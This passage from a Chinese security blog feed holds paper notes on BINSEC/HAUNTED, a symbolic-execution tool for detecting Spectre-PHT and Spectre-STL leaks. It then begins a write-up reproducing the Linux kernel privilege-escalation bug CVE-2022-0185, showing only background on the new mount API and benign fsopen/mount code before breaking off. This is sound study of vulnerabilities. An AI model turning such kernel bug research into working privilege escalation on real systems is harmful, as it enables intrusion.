对应一个最近的符号化内存 $\mu _{3}$ 的符号化的 $select$ 操作，因为所有先前的 store 操作都被按顺序编码进了 $\mu _{3}$ ，这对应着顺序执行</li><li>第一个瞬态值 $t _{2}$ 通过绕过 store buffer 中的第一个 entry 而获得，这对应着 $\mu _{2}$ 中的一个符号化 $select$ 操作</li><li>最后一个瞬态值 $t _{1}$​ 通过绕过 store buffer 中的第一与第二个 entry 并从主存取值而获得，这对应着 $\mu _{1}$ 中的一个符号化 $select$ 操作</li></ul><p>类似地，变量 <code>y</code> 同样有三种可能的取值</p><p>如 <code>Fig. 2d </code> 中所示的 <em>Explicit</em> 探索策略为 load 的每个能获取的可能的值进行符号执行分支，这将很快导致路径爆炸，我们通过实验表明（Section V-C）即便是在较少代码上（100条指令）这个问题也很难解决</p><p><em>2) Haunted RelSE for Spectre-STL</em> ：研究者首先观察到大部分路径都是多余的，一个 load 可以通过先前的非别名 store 进行代偿，考虑 <code>Fig. 2c </code>中的评估，若我们能够确认 load 的下标 $a$ 与第二个 store 的下标 $a _{2}$ 不同，根据数组的定义，我们有 $t _{2} &#x3D; t _{1}$ ，由此路径 $x \to t _{2}$ 与其所有的子路径都是多余的； <em>研究者基于一种著名的称之为 read-over-write 的对符号数组的优化来检测与剪枝多余的情况</em> （cases）</p><p>然而，对多余情况的合并并不足以解决路径爆炸（参见 Section V），由此 <em>研究者提出一种新的编码以在一个单独的路径谓语中保存剩下的情况</em> ，其使用符号化的 <em>if-then-else</em> 来在一个单独的表示中编码所有可能被 load 取的值，而非为每个可能的情况进行分支执行</p><p>例如 <code>Fig. 2c</code> 中对 load 表达式的评估，在对第二个 load 的评估之后，变量 $y$ 可以取值 $r’,t’<em>{1},t’</em>{2}$，研究者引入两个新的布尔变量 $b’ <em>{1}$ 与 $b’ <em>{2}$ 并构建表达式 $(ite\ b’</em>{1}t’</em>{1}(ite\ b’<em>{2}t’</em>{2}r’))$，求解器可以让 $y$ 取如下值：</p><ul><li>瞬态值 $t’<em>{1}$ ，通过将 $b’</em>{1}$ 设为 true</li><li>瞬态值 $t’<em>{2}$ ，通过将 $b’</em>{1}$ 设为 false 且 $b’_{2}$ 设为 true</li><li>常规值 $r$，通过将 $b’<em>{1}$ 与 $b’</em>{2}$ 都设为 false</li></ul><p>最后，瞬态值  $t’<em>{1}$ （或是  $t’</em>{2}$） 可以简单地通过将  $b’<em>{1}$ （或是 $b’</em>{2}$）设为 false 来丢弃 </p><p><img src="https://s2.loli.net/2023/01/27/LK3SeluXqFkg5mb.png" alt="Figure 2: Speculative RelSE of program in Fig. 2a. The symbolic memory is given in Fig. 2b and the symbolic evaluation of load instructions is detailed in Fig. 2c. Figure 2d illustrates the symbolic execution tree obtained from the Explicit exploration strategy; and Fig. 2e, the tree obtained from Haunted RelSE, where solid paths denote regular executions and dotted paths denote transient executions."></p><h1 id="0x04-IMPLEMENTATION-OF-HAUNTED-RELSE"><a href="#0x04-IMPLEMENTATION-OF-HAUNTED-RELSE" class="headerlink" title="0x04. IMPLEMENTATION OF HAUNTED RELSE"></a>0x04. IMPLEMENTATION OF HAUNTED RELSE</h1><p>本节介绍 Haunted RelSE 的技术细节，主要关注于用以分析 SCT 的二进制级的 RelSE 的变化</p><p>由于对数据的依赖项的存在，大部分指令自然地执行或是不能被重排序，其实对于 Spectre-PHT 我们只需要考虑对条件分支的重排序（Section IV-A）并对 Spectre-STL 重排序 load 与 store 即可（Section IV-B）</p><p>一个表示为 $\sigma $ 的符号配置（symbolic configuration）由以下组成：</p><ul><li>当前位置 $l$ ，用以获取程序 $P$ 中的当前指令 $P[l]$</li><li>符号执行  $\delta $  的当前深度</li><li>一个符号寄存器映射 $\rho$ ，将程序变量映射到对应的符号值</li><li>两个路径谓语 $\pi$ 与 $\widetilde{\pi}$ （具体参见 Section IV-A）</li><li>一个符号化内存 $\widehat{\mu}$——一对符号数组、其 store 操作的 <em>过期深度</em> （retirement depth）</li><li>一组瞬态的 load $\widetilde{\lambda}$ （具体参见 Section IV-B）</li></ul><p>记号 $\sigma.f$ 表示配置 $\sigma$ 中的字段 $f$，研究者还定义了一个函数 $eval_expr(\sigma ,e)$ 用以在符号配置  $\sigma $  中计算一个 DBA 表达式 $e$ 到一个符号值</p><p>相比于直接对重排序缓冲区进行建模，研究者使用符号执行的 <em>当前深度</em> （current depth）来追踪要失效（retired）的指令，一条指令在至多 ∆ 步之后必须要退出，其中 ∆ 为重排序缓冲区的大小；表达式被附注了一个深度以确认其是否要退出，或是其是否依赖于内存，例如寄存器映射 $\rho$ 中的一个变量 $v$ 映射到一对 $(\widehat{\psi},\delta)$ ，其中 $\delta$ 为最近内存访问的失效深度（retirement depth），当 $\delta$ 不需要在上下文中时，其便被省略掉了</p><h3 id="A-Haunted-RelSE-for-Spectre-PHT"><a href="#A-Haunted-RelSE-for-Spectre-PHT" class="headerlink" title="A. Haunted RelSE for Spectre-PHT"></a>A. Haunted RelSE for Spectre-PHT</h3><p><em>1) Evaluation of conditional instructions</em> ：与标准的符号执行不同，条件并不会被立刻加入到路径谓语中，而是会与其退出深度一起被保存在一个 <em>推测路径谓语</em> （speculative path predicate） $\widetilde{\pi}$ 中；当达到一个条件的失效深度时，其会被从推测路径谓语中移除，添加到 <em>失效路径谓语</em> （retired path predicate） $\pi$ 中</p><p>对条件分支的评估如 <code>Algorithm 1</code> 所示，函数首先会评估条件的符号值并确认其可以被安全地泄露，之后其通过更新位置与推测路径谓语  $\widetilde{\pi}$  以沿着分支 <code>then</code>  计算后续状态 $\sigma _{t}$ 、沿着分支 <code>else</code> 计算后续状态 $\sigma _{f}$ </p><p><img src="https://s2.loli.net/2023/01/27/eAi2Hs3fFEqlK4w.png" alt="image.png"></p><p><em>2) Determining speculation depth</em> ：一个条件分支后的推测路径是动态计算的，考虑当其所依赖的所有内存访问都失效时，一个条件可以被完全解出（且预测错误的路径可以被去除），这意味着若该条件并不依赖于内存，则分支并未预测错误</p><p>这需要为每个表达式保存其最后内存访问的深度，如 <code>Algorithm 1</code> 所示，在一个条件分支上， $ite\ c\ ?l <em>{true}:l</em>{false}$ 被计算为一个符号值 $\widehat{\varphi}$ 与深度 $\delta$ ，该深度 $\delta$ 被作为条件的退出深度而添加到推测路径谓语  $\widetilde{\pi}$  中</p><p><em>3) Invalidate transient paths</em> ：在 <code>Algorithm 2</code> 中，条件分支在函数 $retirePHT(\pi,\widetilde{\pi},\delta)$ 中失效，该函数从推测路径谓语 $\widetilde{\pi}$ 中移除所有带有小于当前深度 $\delta _{current}$ 的失效深度 $\delta _{ret}$ 的条件，并将其添加到失效路径谓语 $\pi$ 中，并返回更新后的路径谓语  $\pi$ 与 $\widetilde{\pi}$ ；若  $\pi$ 不可满足，则符号执行将停止</p><p><img src="https://s2.loli.net/2023/01/27/tl29pvOeFdrBTGj.png" alt="image.png"></p><h3 id="B-Haunted-RelSE-for-Spectre-STL"><a href="#B-Haunted-RelSE-for-Spectre-STL" class="headerlink" title="B. Haunted RelSE for Spectre-STL"></a>B. Haunted RelSE for Spectre-STL</h3><p><em>1) Symbolic memory</em> ：在一个符号配置中，内存 $\widehat{\mu}$ 为从初始内存开始的符号化 store 操作的历史，我们可以使用这个按时间顺序的表示来重新构造 <em>store buffer</em> 与 <em>main memory</em> 的内容；store buffer 也是对符号化内存的最后 <code>|SB|</code> 条未失效 store 的限制，其中 <code>|SB|</code> 为 store buffer 的大小，形式上其被定义为：</p><p><img src="https://s2.loli.net/2023/01/27/Xt352nyMkC8R6vO.png" alt="image.png"></p><p>其中 $last(n,\widehat{\mu})$ 为符号化内存 $\widehat{\mu}$ 的最后 $n$ 个元素</p><p>类似地， <em>主存</em> （main memory）被定义为符号化内存堆失效的 store 操作的限制，形式上定义为 $Mem(\widehat{\mu},\delta)\triangleq\widehat{\mu}\backslash SB(\widehat{\mu},\delta)$</p><p>对一个 store 指令的评估如 <code>Algorithm 3</code> 所示，首先该函数会计算下标的符号值并确认其可以在 <em>常规路径谓语</em> $\pi _{reg}$ 下被安全地泄露（即，失效路径谓语 $\pi$ 与所有 $\widetilde{\pi}$ 中的未决的条件的结合，加上 $\lambda$ 中失效的 transient loads ），接下来其使用一个符号化的 store 操作来更新符号化内存并将该 store 的失效深度设为 $\delta + \Delta$，该失效深度用以确认 store buffer 中的哪一个 store 操作在等待中、哪一个已作用于主存上</p><p><img src="https://s2.loli.net/2023/01/28/HnTcajkiSudZODv.png" alt="image.png"></p><p><em>2) Evaluation of load expressions</em> ：load 表达式可以通过 <em>store-to-load forwarding</em> 从 store buffer 中获取一个带有匹配地址的未决的 store，也可以推测性地绕过 store buffer 中未决的 store 并从主存取值；相较于考虑一个 load 表达式与 store buffer 中先前所有的 store 之间的交织部分，研究者选用 <em>read-over-write</em> 来辨识与丢弃大部分的 load 与 先前的 store 自然地 commute 的情况； <em>Read-over-write</em> 为一个著名的对数组理论的简化，其在求解器之前解出了符号化数组的 select 操作</p><p>为了高效地对比下标，read-over-write 依赖于 <em>语法项等价性</em> （syntactic term equality），比较函数 $eq^{井} (i,j)$ 仅在 $i$ 与 $j$ 在语法上相等&#x2F;不等时返回 true&#x2F;false，若项之间无法进行比较，则为未定义，表示为 $⊥$</p><blockquote><p>公式里的这个 <code>#</code> 不懂为啥老是渲染错误，只能用 <code>井</code> 替代一下：( </p></blockquote><p>为了高效地在求解器之前解出 select 操作，read-over-write 定义了一个依赖于以下语法项等价性的 $lookup _{mem}$ 函数：</p><p><img src="https://s2.loli.net/2023/01/28/5t1P2KsjeJirdFz.png" alt="image.png"></p><p>其中 $\widehat{\mu _{n}} \triangleq store(\widehat{\mu} _{n-1} , j, \widehat{\varphi})$</p><p>例如考虑这样的一个内存 $\widehat{\mu}$ ：</p><p><img src="https://s2.loli.net/2023/01/28/s49Iic8LEz5hfO3.png" alt="image.png"></p><ul><li>$lookup _{mem}(\widehat{\mu},ebp - 8)$ 返回 $\widehat{\varphi}$</li><li>$lookup _{mem}(\widehat{\mu},ebp - 4)$ 首先会比较 $ebp - 4$ 与 $ebp - 8$ 并确认他们是 <em>语义不等的</em> （syntactically distinct，即 $\lnot eq^(ebp - 4, eax) &#x3D; \perp$），因此 $select$ 操作并不能被简化</li></ul><p>为了高效地建模 store-to-load forwarding，研究者定义了一个 <code>Algorithm 4</code>  中所示的新函数 $lookup _{SB}$，其返回 store buffer 中一组匹配的 store；此外，$lookup _{SB}$ 每个 load 必须要被失效化的深度，即对于相同地址的一个最近的 store 的失效深度</p><p><img src="https://s2.loli.net/2023/01/28/MKj5Ln9BG1xJ3IH.png" alt="image.png"></p><p>最终研究者定义了 <code>Algorithm 5</code> 中所示函数 $lookup _{ite} (\widehat{\mu},i,\widetilde{\lambda},\delta)$ ，其将 $lookup _{SB}$ 的结果编码为一个符号化的使用新的布尔变量的 if-then-else 表达式；该函数返回 load 表达式的值，并将过程中定义的布尔变量添加到 $\widetilde{\lambda}$ 中；此外，为了实现 $BINSEC&#x2F;HAUNTED$ ，研究者使用布尔变量的名字来编码关于 load 与前面的 store 的位置的信息；因此，我们有可能使用求解器返回的反例来得知触发漏洞是绕过了哪一个 store，这有助于我们了解漏洞并重构攻击图</p><p><img src="https://s2.loli.net/2023/01/28/Bq6ouwNsAkh2Ytz.png" alt="image.png"></p><p>对一个 load 指令的评估如 <code>Algorithm 6</code> 所示，首先该函数会计算下标的符号值并确认其可以被安全地泄露，接下来其会调用 $lookup _{ite}$ 获得 load 指令可以取的符号值的集合，编码为一个单独的 if-then-else 表达式 $\widehat{\iota}$ ，并更新 transient load 的集合 $\widetilde{\lambda}$ ；最后其会使用 load 的值更新寄存器映射并将其失效深度设为 $\delta + \Delta$ ；失效深度会在接下来的对条件分支的评估中使用，以确定该条件是否决定于内存</p><p><img src="https://s2.loli.net/2023/01/28/i2ous4LrlWd8vUg.png" alt="image.png"></p><p><em>3) Invalidate transient loads</em> ：当更多的最近的匹配的 store 都通过设置对应的布尔变量为 false 而失效了，transient load 的值可以被无效化；于 <code>Algorithm 7</code> 中定义的函数 $retireSTL(\pi,\widetilde{\lambda},\delta)$ 从 transient load 的集合 $\widetilde{\lambda}$ 中移除所有的带有在 $\delta$ 下的失效深度的 load，并在路径谓语 $\pi$ 中将相应的布尔变量设为 false；为了可读性，接下来我们引入一个通过同时使用 $retirePHT$ 与 $retireSTL$ 以停止所有推测的函数 $retireALL$ </p><p><img src="https://s2.loli.net/2023/01/28/7Nqnw9sDomUP4Qh.png" alt="image.png"></p><h3 id="C-Theorems"><a href="#C-Theorems" class="headerlink" title="C. Theorems"></a>C. Theorems</h3><p>本节研究者将证明 Haunted RelSE 对于 SCT 的正确性与完备性（达到一个展开边界），这意味着当 Haunted RelSE 报告了一个违规（violation），其为一个真正的 SCT 违规（没有上近似），且当其在深度 k 上报告没有违规时，该程序在深度 k 上是安全的（没有下近似）；为此，研究者证明了 Haunted RelSE 与 Explicit RelSE 是等价的，且展示了 Explicit RelSE 对于达到一个展开边界（up-to-an-unrolling-bound）的 SCT 而言在上是正确且完备的</p><p><strong>Theorem 1.</strong> <em>Explicit RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em></p><p>$Proof(sketch).$ 该证明为一个简单的对 RelSE 对常数时间的正确性与完备性的证明对推测性语义（speculative semantics）的扩展；该扩展需要展示：</p><ul><li>1）在符号执行中瞬态路径上报告的违规对应到具体瞬态执行中的违规</li><li>2）若在具体瞬态执行中有一个违规，则在符号执行中有一个路径会报告该违规</li></ul><p>接下来研究者将展示 Haunted RelSE 与 Explicit RelSE 等价</p><p><strong>Theorem 2.</strong> （Equivalence Explicit and Haunted RelSE） <em>Haunted RelSE 检测到了一个违规当且仅当 Explicit RelSE 检测到了一个违规</em>  </p><p>在 <code>Appendix B</code> 中研究者给出了一个证明草图，其首先展示了 Spectre-PHT 的理论：在一个条件分支后，Haunted RelSE 探索的两条路径完全地获取了 Explicit RelSE 中探索的四条路径的行为；研究者接下来展示 Spectre-STL 的理论：在一条 load 指令之后，Haunted RelSE 产生的单条路径完全获得了 Explicit RelSE 中多条路径的行为</p><p><strong>Corollary 1.</strong> <em>Haunted RelSE 对于达到一个展开边界的推测常数时间而言在是正确且完备的</em> </p><h3 id="D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE"><a href="#D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE" class="headerlink" title="D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE"></a>D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE</h3><p>研究者基于二进制级的分析器 BINSEC 实现了 Haunted RelSE 并称之为 <code>BINSEC/HAUNTED</code> ，其获取一个 x86 可执行文件、秘密输入的位置、一个初始内存配置（通常为完全符号化的）、推测的深度、store buffer 的大小作为输入；BINSEC&#x2F;HAUNTED 以深度优先搜索对程序进行探索，优先处理瞬态路径，并带着反例（即，导致了损坏的初始配置与推测选项）报告 SCT 损坏；其使用当前位向量理论上最好的 SMT 求解器 <code>Boolector</code></p><h1 id="0x05-EXPERIMENTAL-EVALUATION"><a href="#0x05-EXPERIMENTAL-EVALUATION" class="headerlink" title="0x05. EXPERIMENTAL EVALUATION"></a>0x05. EXPERIMENTAL EVALUATION</h1><p>研究者在本论文中回答了这些研究问题：</p><p><strong>RQ 1 Effectiveness.</strong> BINSEC&#x2F;HAUNTED 是否能够在真实世界的密码学二进制文件中发现 Spectre-PHT 与 Spectre-STL 损坏？</p><p><strong>RQ2 Haunted vs Explicit.</strong> Haunted RelSE 与 Explicit RelSE 对比起来如何？</p><p><strong>RQ3 BINSEC&#x2F;HAUNTED vs. SoA tools.</strong> BINSEC&#x2F;Haunted 与最先进的工具比起来如何？</p><p>为了回答 RQ1 与 RQ2，研究者对比了 <em>Explicit</em> 与 <em>Haunted</em> 用以关系符号执行的探索策略的性能——两者都应用于 BINSEC&#x2F;HAUNTED ——在一组真实世界密码学二进制文件与 litmus benchmark（Sections V-B 与 V-C）；为了回答 RQ3，研究者对比了 BINSEC&#x2F;HAUNTED 与最先进的工具 KLEESpectre 与 Pitchfork（Section V-D）</p><p><strong>Legend.</strong> 本节中，$I _{x86}$ 为被探索的不同 x86 指令的数量， $P$ 为探索的路径数量，$T$ 为总的执行时间，<code>一个虫子符号</code> （打不出来）为发现的漏洞数量，⏳为超时数量，✓ 为被证明安全的程序数量，× 为被证明不安全的程序数量</p><h3 id="A-benchmark"><a href="#A-benchmark" class="headerlink" title="A. benchmark"></a>A. benchmark</h3><p>研究者在一台带有 <code>Intel(R) Xeon(R) CPU E3-1505M v6 @ 3.00GHz </code> 处理器与 32GB 内存的机器上进行实验，除了初始栈指针 $esp$ 以外（类似于related work[5]）所有的输入都是符号的，且数据结构为静态分配的；用户需要标记秘密，其余所有的值都是公开的；研究者将推测深度设置为 200 条指令并将 store buffer 的大小设置为 20 条指令，此外，研究者仅考虑顺序执行中的间接跳转目标并实现了一个 <em>影子栈</em> 以限制返回指令在一个合适的返回位置；考虑瞬态跳转目标需要在任意位置建模间接跳转，对于符号执行而言虽然可行但非常棘手</p><p>研究者通过如下程序评估 BINSEC&#x2F;HAUNTED：</p><ul><li><code>litmus-pht</code> ：16 个来自于 Pitchfork 的修改过的 Paul Kocher 的 litmus tests 集合的小的测试用例（litmus tests）用以 Spectre-PHT</li><li><code>litmus-pht-patched</code> ：添加了下标掩码（index masking）的 <code>litmus-pht</code></li><li><code>litmus-stl</code> ：新的一组用以 Spectre-STL 的 litmus tests</li><li>来自 OpenSSL 与 Libsodium 密码学库（详见 Table I） 的密码学原语，包括并扩展至在 <a href="https://doc.libsodium.org/secret-key_cryptography/secretbox">[5]</a> 中被分析的那些</li></ul><p>程序使用 gcc 10.1.0 编译到 32 位 x86 架构上，litmus tests 被以 <code>-fno-stack-protector</code> 选项进行编译，Spectre-STL 的 litmus tests 额外添加了 <code>-no-pie</code> 与 <code>-fno-pic</code> 以排除由这些选项引入的损坏（参见 Section VI）；由于同一原因，<code>donna</code> 与 <code>tea</code> 不带有 <code>-fno-stack-protector</code> 编译选项，优化级别为 <code>O1、O2、O3</code> 与 <code>Ofast</code>；Libsodium 由默认的 Makefile 进行编译，OpenSSL 开启了 <code>O3</code> 优化，两者都开启了 stack protector</p><p><img src="https://s2.loli.net/2023/01/29/4ZgLHYdQ69ibICM.png" alt="image.png"></p><p><em>Note on Stack Protectors</em> ：由 stack protector 引入的解决错误的代码非常复杂且包含了许多无法在纯净的符号执行中分析的系统调用，BINSEC&#x2F;HAUNTED 在系统调用上停止路径执行且每个程序仅跳转到 stack protector 的代码一次，这意味着其可能会错过一些未被探索的代码中的损坏；此外，对于 litmus tests、<code>tea</code>、<code>donna</code>，超时时长被设置为 1 小时，但对于包含 stack protector 的代码则延长至 6 小时（Libsodium 与 OpenSSL）</p><h1 id="0x06-NEW-VULNERABILITIES-AND-MITIGATIONS"><a href="#0x06-NEW-VULNERABILITIES-AND-MITIGATIONS" class="headerlink" title="0x06. NEW VULNERABILITIES AND MITIGATIONS"></a>0x06. NEW VULNERABILITIES AND MITIGATIONS</h1><h1 id="0x07-RELATED-WORK"><a href="#0x07-RELATED-WORK" class="headerlink" title="0x07. RELATED WORK"></a>0x07. RELATED WORK</h1><h1 id="0x08-CONCLUTION"><a href="#0x08-CONCLUTION" class="headerlink" title="0x08. CONCLUTION"></a>0x08. CONCLUTION</h1><p>研究者提出了 Haunted RelSE，一种基于关系符号执行的用以静态检测 Spectre-PHT 与 Spectre-STL 漏洞的技术；特别地，Haunted RelSE 能够通过同时推理常规执行与瞬态执行以显著地减少寻址推测路径的开销；研究者将 Haunted RelSE 应用于一个关系符号执行工具 <code>BINSEC/HAUNTED</code> 中；据研究者的实验结果所示，Haunted RelSE 为迈向可扩展的对 Spectre attacks 的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下极大地提升分析速度，在对中等大小的真实世界中的密码学二进制文件的分析推测语义复杂性进行剪枝；对于 Spectre-STL，BINSEC&#x2F;HAUNTED 是第一个可以彻底分析真实世界中较小的密码学二进制文件并在中等大小的密码学二进制文件中找到漏洞的工具</p><p>最后，研究者通过 BINSEC&#x2F;HAUNTED，报告了一个标准的对 Spectre-PHT 的防护可以轻易地引入 Spectre-STL 漏洞并提出了修复方法，且发现了一个著名的用于编译位置无关可执行文件的 GCC 编译选项会引入 Spectre-STL</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;鬼！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="符号执行" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制分析" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
    <category term="论文笔记" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spectre" scheme="http://blog.arttnba3.cn/tags/Spectre/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x09】CVE-2022-0185 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T04:04:19.000Z</published>
    <updated>2023-01-15T05:52:06.992Z</updated>
    
    <content type="html"><![CDATA[<p>还是 mount 好</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> 是 2022 年初爆出来的一个位于 filesystem context 系统中的 <code>fsconfig</code> 系统调用中的一个堆溢出漏洞，对于有着 <code>CAP_SYS_ADMIN</code> 权限（或是开启了 unprivileged namespace）的攻击者而言其可以利用该漏洞完成本地提权，该漏洞获得了高达 <code>8.4</code> 的 CVSS 评分</p><blockquote><p>发现漏洞的安全研究员的挖掘与利用过程参见<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">这里</a>，本文编写时也有一定参考</p></blockquote><p>本文选择内核版本 <code>5.4</code> 进行分析，在开始分析之前，我们先来补充一些基础知识</p><h2 id="Filesystem-mount-API-初探"><a href="#Filesystem-mount-API-初探" class="headerlink" title="Filesystem mount API 初探"></a>Filesystem mount API 初探</h2><blockquote><p>参见<a href="https://zhuanlan.zhihu.com/p/93592262">知乎上的该系列文章</a></p></blockquote><p>相信大家对于 Linux 下的文件系统的挂载都是非常熟悉—— <code>mount</code>  系统调用被用以将文件系统挂载到以 <code>/</code> 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 <code>/dev/sdb1</code> 到 <code>/mnt/temp</code> 目录下，之后就能在该目录下进行文件访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>或是通过编写程序的方式使用裸的 <code>mount</code> 系统调用进行挂载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是<a href="https://lwn.net/Articles/753473/">总有些人想搞个大新闻</a>，以 AL Viro 为首的开发者认为旧的 <code>mount</code> 系统调用存在诸多漏洞与设计缺陷，于是决定重写一套新的 mount API，并<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">成功被合并到内核主线</a>，称之为 <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>新的 mount API 将过去的一个简单的 <code>mount</code> 系统调用的功能拆分成了数个新的系统调用，对应不同的文件系统挂载阶段，于是乎现在 Linux 上有着两套并行的 mount API</p><blockquote><p><del>👴的评价是闲着没事干可以去把村口大粪挑一下</del></p></blockquote><h3 id="Step-I-fsopen-获取一个-filesystem-context"><a href="#Step-I-fsopen-获取一个-filesystem-context" class="headerlink" title="Step.I - fsopen: 获取一个 filesystem context"></a>Step.I - fsopen: 获取一个 filesystem context</h3><p>还记得笔者以前说过的 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux 中一切皆文件</a> 的哲学吗，在新的 mount API 中也遵循了这样的哲学——如果说 <code>open()</code> 系统调用用以打开一个文件并提供一个文件描述符，那么 <strong><code>fsopen()</code> 系统调用便用于打开一个文件系统，并提供一个”文件系统描述符“</strong>——称之为 **<code>文件系统上下文</code>**（filesystem context）</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it&#39;s all FILES"></p><p>由于标准库中还未添加 new mount API 相关的代码，因此我们需要写 raw syscall 来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 <code>ext4</code> 文件系统上下文（需要 <code>CAP_SYS_ADMIN</code> 权限，或是开启了 unprivileged namespace 的情况下使用 <code>unshare()</code> 系统调用创建带有该权限的 namespace）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    